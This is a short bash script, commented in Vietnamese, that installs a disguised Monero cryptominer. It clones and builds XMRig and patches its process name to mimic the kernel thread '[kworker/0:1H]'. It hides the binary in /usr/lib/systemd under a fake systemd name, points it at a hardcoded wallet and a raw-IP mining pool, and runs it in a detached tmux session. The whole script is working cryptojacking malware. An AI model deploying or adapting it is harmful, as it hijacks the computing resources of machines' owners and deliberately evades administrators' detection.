#!/bin/bash

# === Thông số cấu hình ===
WALLET="84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z"
POOL="gulf.moneroocean.stream:10128"
THREADS=$(nproc)
PROCESS_NAME="[kworker/0:1H]"
INSTALL_DIR="/usr/lib/systemd"
BINARY_NAME="systemd-kblockd"

# === Cài gói cần thiết ===
sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# === Clone xmrig ===
cd /tmp
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig

# === Chỉnh sửa để ẩn tên tiến trình ===
sed -i '/int main(/a #include <sys/prctl.h>' src/main.cpp
sed -i '/xmrig::init();/a prctl(PR_SET_NAME, (unsigned long)"$PROCESS_NAME", 0, 0, 0);' src/main.cpp

# === Build xmrig ===
mkdir build && cd build
cmake .. -DWITH_HWLOC=OFF
make -j$THREADS

# === Tạo config mặc định ===
cat > config.json <<EOF
{
    "autosave": true,
    "cpu": {
        "enabled": true
    },
    "opencl": {
        "enabled": false
    },
    "cuda": {
        "enabled": false
    },
    "pools": [
        {
            "url": "161.248.146.81:80",
            "user": "84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

# === Di chuyển xmrig về vị trí ẩn ===
sudo mkdir -p $INSTALL_DIR
sudo mv xmrig $INSTALL_DIR/$BINARY_NAME
sudo cp config.json $INSTALL_DIR/config.json
sudo chmod +x $INSTALL_DIR/$BINARY_NAME

# === Chạy xmrig với tên giả và config ẩn ===
cd $INSTALL_DIR
tmux new-session -d -s sysblock "exec -a '$PROCESS_NAME' $INSTALL_DIR/$BINARY_NAME -c $INSTALL_DIR/config.json"
